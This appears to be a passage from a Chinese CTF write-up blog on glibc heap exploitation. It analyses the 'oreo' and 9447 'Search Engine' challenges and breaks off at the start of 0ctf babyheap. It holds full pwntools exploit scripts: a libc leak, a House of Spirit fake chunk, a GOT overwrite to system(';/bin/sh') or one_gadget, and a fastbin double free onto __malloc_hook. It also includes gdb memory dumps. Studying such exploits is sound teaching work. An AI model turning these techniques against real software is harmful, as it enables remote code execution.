class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = dword_804A288;</span><br><span class="line">  dword_804A288 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A288 )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)dword_804A288 + <span class="number">13</span>) = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle name: "</span>);</span><br><span class="line">    fgets(dword_804A288 + <span class="number">25</span>, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(dword_804A288 + <span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle description: "</span>);</span><br><span class="line">    fgets(dword_804A288, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(dword_804A288);</span><br><span class="line">    ++dword_804A2A4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something terrible happened!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看出filename从25开始的，推出前面的description为25，而name长度为27是如何推出来的呢？看图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2f93s8owgj31hc0sjwrg.jpg" alt="2"></p><p>我这是在输出函数</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048729</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rifle to be ordered:\n%s\n"</span>, <span class="string">"==================================="</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = dword_804A288; i; i = (<span class="keyword">char</span> *)*((_DWORD *)i + <span class="number">13</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, i + <span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, i);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==================================="</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里下的断点，你看ida解析出来的什么鬼，i+13，莫名奇妙的写法，完全看不懂，然后我定位到这里断点后，他加的值是0x34，他是从结构体开头加的0x34(10进制:52)，然后取出下一个指针，也就是next指针，继续进行循环，ida解析出的i+13完全乱来的，52-25 = 27，所以大小就这么退出来了，不理解这个结构体，这道题很多写法都看不懂，比如他的偏移什么，理解了就好构造了。</p><h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><p>题目里有堆溢出，我们可以通过堆溢出溢出到结构体的next指针，让next指针指向got表某一项，从而泄露出地址，进而求出libc的地址，求出libc的地址过后，在利用house of sprit，free掉一个自己伪造的chunk,进而达到覆写got表成one_gadget，然后通过调用该函数获得权限</p><h3 id="初始化函数"><a href="#初始化函数" class="headerlink" title="初始化函数"></a>初始化函数</h3><p>将堆的各个操作写成函数，因为堆里有很多重复操作，所以这样会比较方便</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, description)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br></pre></td></tr></table></figure><h3 id="leak地址"><a href="#leak地址" class="headerlink" title="leak地址"></a>leak地址</h3><p>我们知道他有个next指针，所以我们覆盖掉他的next指针，在利用show函数就可以打印任意地址的内容了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#first leak the libc</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">result = p.recvuntil(<span class="string">"==================================="</span>)[:<span class="number">4</span>]</span><br><span class="line">puts_addr = u32(result)</span><br><span class="line">log.success(<span class="string">"puts_got = &#123;:#x&#125;"</span>.format(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br></pre></td></tr></table></figure><p>这样就leak出puts的地址，接着就可以获得libc地址</p><h3 id="填充大小并修改next指针"><a href="#填充大小并修改next指针" class="headerlink" title="填充大小并修改next指针"></a>填充大小并修改next指针</h3><p>这题目有个计算数值的变量，也就是说你malloc一个，他就会加1，我们可以将这里当作chunk大小，因为一个枪支结构体大小为0x38,所以堆块大小为0x40,我们将其大小提升至0x40，并让最后一个堆块的next指针指向这块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">0x3f</span>:</span><br><span class="line">    add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), <span class="string">'b'</span>*<span class="number">25</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0x804A2A8</span>)</span><br><span class="line">add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br></pre></td></tr></table></figure><p>0x804a2a4是count的地址，所以+4就是堆块的数据段</p><h3 id="绕过检测"><a href="#绕过检测" class="headerlink" title="绕过检测"></a>绕过检测</h3><ol><li><p>对齐检查<br>在此处的检查中，要求堆块具有16bytes对齐，所以chunk header的起始地址应为0x**0的形式。</p></li><li><p>fake chunk 的size大小检查<br>按照上文中chunk的结构布局，使当前fake chunk的size为合适的大小，能够充足利用并且加入fastbin(0x10-0x80)，</p></li><li><p>next chunk 的size大小检查<br>除了当前chunk的大小，与目标地址物理相邻的内存空间也应按照堆块的结构将size位置改写为能够加入fastbin的合适的大小的数值。</p></li><li><p>标记位检查</p></li></ol><p>This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREVINUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED_ (second lsb) and _NON_MAIN_ARENA (third lsb) bits cause problems…. note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">### begin fake </span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">0x20</span> + p32(<span class="number">0x40</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x34</span>, <span class="string">'b'</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'c'</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">delete()</span><br><span class="line">p.recvuntil(<span class="string">'Okay order submitted!\n'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/60wx 0x804a2c0-0x20</span><br><span class="line">0x804a2a0:	0x00000000	0x00000040	0x0804a2c0	0x00000000</span><br><span class="line">0x804a2b0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2c0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2d0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2e0:	0x00000040	0x00000100	0x62626262	0x62626262</span><br><span class="line">0x804a2f0:	0x62626262	0x00000000	0x63636363	0x63636363</span><br><span class="line">0x804a300:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a310:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a320:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a330:	0x63636363	0x63636363	0x63636363	0x00636363</span><br><span class="line">0x804a340:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a350:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a360:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a370:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a380:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure><p>可以看下内存中的内容,这就是构造完成后的图，然后free掉0x804a2a0这个大小为0x40的堆块，然后在fastbin中是FILO，所以你在申请的堆块就是申请到的是0x804a2a0这个堆块，在0x0804a2a8这个堆块的数据部分的东西就很重要了</p><h3 id="覆写got表"><a href="#覆写got表" class="headerlink" title="覆写got表"></a>覆写got表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">'strlen'</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">payload = p32(sys_addr) + <span class="string">";/bin/sh\x00"</span></span><br><span class="line">edit(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里ctf-wiki用的是strlen表，<strong>然后这里有个小细节。。。记得第二个位置才是结构体的开头，所以payload要放在add的第二个位置</strong>，构造payload为strlen的地址，然后在用edit函数进行编辑</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">Message</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v0 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter any notice you'd like to submit with your order: "</span>);</span><br><span class="line">  fgets(dword_804A2A8, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_80485EC(dword_804A2A8);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit函数在ida里的原样，就是从0x804a2a8指向的空间写东西，这里指向的空间是0x0804a2c0也就是我们刚刚payload写入的位置，然后进行编辑</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/60wx 0x804a2a8-0x8</span><br><span class="line">0x804a2a0:	0x00000001	0x00000041	0x0804a250	0x61616161</span><br><span class="line">0x804a2b0:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0x804a2c0:	0x62000061	0x62626262	0x62626262	0x62626262</span><br><span class="line">0x804a2d0:	0x62626262	0x62626262	0x62626262	0x00000000</span><br><span class="line">0x804a2e0:	0x0000000a	0x00000100	0x62626262	0x62626262</span><br><span class="line">0x804a2f0:	0x62626262	0x00000000	0x63636363	0x63636363</span><br><span class="line">0x804a300:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a310:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a320:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a330:	0x63636363	0x63636363	0x63636363	0x00636363</span><br><span class="line">0x804a340:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a350:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a360:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a370:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a380:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure><p>你看，地址变成了0x804a250</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">► 0x80487eb    call   fgets@plt &lt;0x8048480&gt;</span><br><span class="line">       s: 0x804a250 (strlen@got.plt) —▸ 0xf7e3d440 ◂— 0x7c8b5756</span><br><span class="line">       n: 0x80</span><br><span class="line">       stream: 0xf7f715a0 (_IO_2_1_stdin_) ◂— 0xfbad208</span><br></pre></td></tr></table></figure><p>就是got表的地址<br>然后编辑过后调用strlen就会出发了，这里我有个不懂的地方就是将got表覆盖成system的地址，然后我不知道如何进行传参数，ctf-wiki给的是‘;/bin/sh\x00’，经过测试system(“abcd;/bin/sh”)在c语言里也是可以获得权限的，<br>这里是调用strlen，strlen求的是payload长度，所以相当于system(payload)<br>也就是相当于system(p32(sys_addr)+”;/bin/sh”)</p><p>并且他前面求出了bin_sh地址，他也没用上。应该也是这里卡住了一小会，我是转头改用了one_gadget</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x5fbc5</span></span><br><span class="line">payload = p32(one_gadget)</span><br><span class="line">edit(payload)</span><br><span class="line">puts()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>完结，撒花<br>完整exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'oreo'</span></span><br><span class="line">ctx.remote_libc = <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./oreo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    p = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">""</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'PID: '</span> + str(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, description)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#first leak the libc</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">    add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">    result = p.recvuntil(<span class="string">"==================================="</span>)[:<span class="number">4</span>]</span><br><span class="line">    puts_addr = u32(result)</span><br><span class="line">    log.success(<span class="string">"puts_got = &#123;:#x&#125;"</span>.format(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#second fake bin</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">0x3f</span>:</span><br><span class="line">        add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), <span class="string">'b'</span>*<span class="number">25</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0x804A2A8</span>)</span><br><span class="line">    add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">### begin fake </span></span><br><span class="line">    payload = p8(<span class="number">0</span>)*<span class="number">0x20</span> + p32(<span class="number">0x40</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x34</span>, <span class="string">'b'</span>)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'c'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    edit(payload)</span><br><span class="line">    delete()</span><br><span class="line">    p.recvuntil(<span class="string">'Okay order submitted!\n'</span>)</span><br><span class="line">    payload = p32(elf.got[<span class="string">'strlen'</span>])</span><br><span class="line">    payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">    add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">    <span class="comment">#one_gadget = libc_base + 0x5fbc5</span></span><br><span class="line">    <span class="comment">#payload = p32(one_gadget)</span></span><br><span class="line">    payload = p32(sys_addr) + <span class="string">";/bin/sh\x00"</span></span><br><span class="line">    edit(payload)</span><br><span class="line">    puts()</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h2><p>这道题说实话，我连功能怎么使用都不知道。。最后看了wp，也是似懂非懂，不过大概漏洞过程我是理解了的</p><p>先利用unsortbin泄露地址<br>double free 到malloc_hook<br>然后改malloc_hook为one_gadget<br>错位部分自己解决</p><p>最近学到一个新姿势，double free触发malloc_hook，下一篇写个最近遇到的有趣的题目</p><p>其余部分参考ctf-wiki</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'search'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'search'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="comment"># FORTIFY:  Enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsortedbin_offset_main_arena = offset_bin_main_arena(<span class="number">0</span>)</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_sentence</span><span class="params">(s)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"3: Quit\n"</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Enter the sentence size:\n"</span>)</span><br><span class="line">    io.sendline(str(len(s)))</span><br><span class="line">    io.send(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_word</span><span class="params">(word)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"3: Quit\n"</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Enter the word size:\n"</span>)</span><br><span class="line">    io.sendline(str(len(word)))</span><br><span class="line">    io.send(word)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    smallbin_sentence = <span class="string">'s'</span> * <span class="number">0x85</span> + <span class="string">' m '</span></span><br><span class="line">    index_sentence(smallbin_sentence)</span><br><span class="line">    search_word(<span class="string">'m'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Found '</span> + str(len(smallbin_sentence)) + <span class="string">': '</span>)</span><br><span class="line">    unsortedbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">return</span> unsortedbin_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 1. leak libc base</span></span><br><span class="line">    unsortedbin_addr = leak_libc()</span><br><span class="line">    main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena</span><br><span class="line">    libc_base = main_arena_addr - main_arena_offset</span><br><span class="line">    log.success(<span class="string">'unsortedbin addr: '</span> + hex(unsortedbin_addr))</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment"># 2. create cycle fastbin 0x70 size</span></span><br><span class="line">    index_sentence(<span class="string">'a'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#a</span></span><br><span class="line">    index_sentence(<span class="string">'b'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#b</span></span><br><span class="line">    index_sentence(<span class="string">'c'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#c</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">    search_word(<span class="string">'d'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># b-&gt;a-&gt;b-&gt;a-&gt;...</span></span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'n'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. fastbin attack to malloc_hook nearby chunk</span></span><br><span class="line">    fake_chunk_addr = main_arena_addr - <span class="number">0x33</span></span><br><span class="line">    fake_chunk = p64(fake_chunk_addr).ljust(<span class="number">0x60</span>, <span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(fake_chunk)</span><br><span class="line"></span><br><span class="line">    index_sentence(<span class="string">'a'</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(<span class="string">'b'</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    one_gadget_addr = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x60</span>, <span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">fill</span><span class="params">(chunk *a1)</span></span></span><br><span class="line"><span 